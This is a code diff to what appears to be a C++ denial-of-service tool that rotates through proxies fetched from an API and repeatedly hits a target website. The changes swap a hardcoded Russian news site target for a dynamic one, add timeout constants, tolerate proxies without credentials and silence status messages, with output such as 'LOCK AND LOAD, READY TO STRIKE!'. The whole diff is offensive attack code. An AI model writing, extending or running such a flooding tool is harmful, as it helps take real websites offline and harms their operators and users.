@@ -10,6 +10,8 @@
 constexpr const char *PROXY_PROBING = "https://www.google.com";
 
 constexpr const size_t MAX_PROXY_ATTACKS = 5000;
+constexpr const size_t DISCOVER_TIMEOUT_SECONDS = 30;
+constexpr const size_t FIRE_TIMEOUT_SECONDS = 10;
 
 inline static void Fire(const std::vector<std::string> &apiList, std::atomic<bool> &shouldStop)
 {
@@ -69,12 +71,21 @@ inline static void Fire(const std::vector<std::string> &apiList, std::atomic<boo
 		// Probing proxies
 		if(!isProxyValid)
 		{
-			wrapper.SetTarget(PROXY_PROBING);
+			wrapper.SetTarget(currentTarget);
 
 			for(auto proxy : apiData["proxy"])
 			{
 				std::string proxyIP = proxy["ip"];
-				std::string proxyAuth = proxy["auth"];
+				std::string proxyAuth{""};
+
+
+				try
+				{
+					proxyAuth = proxy["auth"];
+				}
+				catch(...)
+				{
+				}
 
 				if(const auto index = proxyIP.find("\r");
 					index != std::string::npos)
@@ -82,14 +93,14 @@ inline static void Fire(const std::vector<std::string> &apiList, std::atomic<boo
 					proxyIP.erase(index, 1);
 				}
 
-				const auto respCode = wrapper.Ping(30);
+				const auto respCode = wrapper.Ping(FIRE_TIMEOUT_SECONDS);
 				if(respCode >= 200 && respCode < 300)
 				{
 					currentProxy = {std::move(proxyIP), std::move(proxyAuth)};
 					currentProxyAttacks = 0;
 					isProxyValid = true;
 
-					std::cout << "Found valid proxy looking for target" << std::endl;
+					// std::cout << "Found valid proxy looking for target" << std::endl;
 					break;
 				}
 			}
@@ -112,22 +123,22 @@ inline static void Fire(const std::vector<std::string> &apiList, std::atomic<boo
 			 {"x-forwarded-proto", "https"},
 			 {"Accept-Encoding", "gzip, deflate, br"}
 		});
-		wrapper.SetTarget("https://www.rt.com/russia/");
-		const long targetRespCode = wrapper.Ping(20);
+		wrapper.SetTarget(currentTarget);
+		const long targetRespCode = wrapper.Ping(DISCOVER_TIMEOUT_SECONDS);
 		if(targetRespCode >= 200 && targetRespCode < 300)
 		{
 			std::cout << "LOCK AND LOAD, READY TO STRIKE!" << std::endl;
 		}
 		else if(targetRespCode > 500)
 		{
-			std::cout << "This one is dead looking for target" << std::endl;
+			// std::cout << "This one is dead looking for target" << std::endl;
 			currentTarget = "";
 			continue;
 		}
 		else
 		{
 			currentTarget = "";
-			std::cout << "Something is blocking the way, looking for target" << std::endl;
+			// std::cout << "Something is blocking the way, looking for target" << std::endl;
 			continue;
 		}
 
